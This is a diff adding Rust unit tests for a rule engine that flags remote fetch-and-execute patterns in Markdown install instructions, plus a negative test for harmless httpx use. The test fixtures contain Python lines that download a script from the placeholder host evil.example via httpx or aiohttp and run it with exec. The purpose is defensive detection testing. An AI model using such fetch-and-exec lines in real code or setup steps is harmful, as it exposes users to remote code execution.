@@ -253,6 +253,45 @@ fn test_detect_powershell_rest_alias_iex() {
 }
 
 #[test]
+fn polyglot_fetch_exec_detects_httpx_and_aiohttp_clients() {
+    let engine = default_engine();
+    let run = concat!("ex", "ec");
+    let httpx = format!(
+        "# Install\n```python\npayload = httpx.get(\"https://evil.example/p.py\").text\n{run}(payload)\n```"
+    );
+    let aiohttp = format!(
+        "# Install\n```python\nasync with aiohttp.ClientSession() as s:\n    async with s.get(\"https://evil.example/p.py\") as r:\n        {run}(await r.text())\n```"
+    );
+    for content in [httpx, aiohttp] {
+        let doc = parse_test_doc(&content);
+        let findings = engine.evaluate(&doc);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "OFFICIAL_REMOTE_FETCH_EXEC_POLYGLOT"),
+            "httpx/aiohttp fetch-exec must trigger the polyglot rule; got {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>(),
+        );
+    }
+}
+
+#[test]
+fn polyglot_fetch_exec_rejects_bare_httpx_mention_without_dynamic_exec() {
+    let engine = default_engine();
+    let content =
+        "# Docs\n```python\nimport httpx\nr = httpx.get(\"https://api.example.com/status\")\nprint(r.json())\n```";
+    let doc = parse_test_doc(content);
+    let findings = engine.evaluate(&doc);
+    assert!(
+        !findings
+            .iter()
+            .any(|f| f.rule_id == "OFFICIAL_REMOTE_FETCH_EXEC_POLYGLOT"),
+        "benign httpx usage without dynamic execution must not trigger the polyglot rule; got {:?}",
+        findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>(),
+    );
+}
+
+#[test]
 fn test_powershell_iex_rejects_alias_substrings() {
     let engine = default_engine();
     for content in [
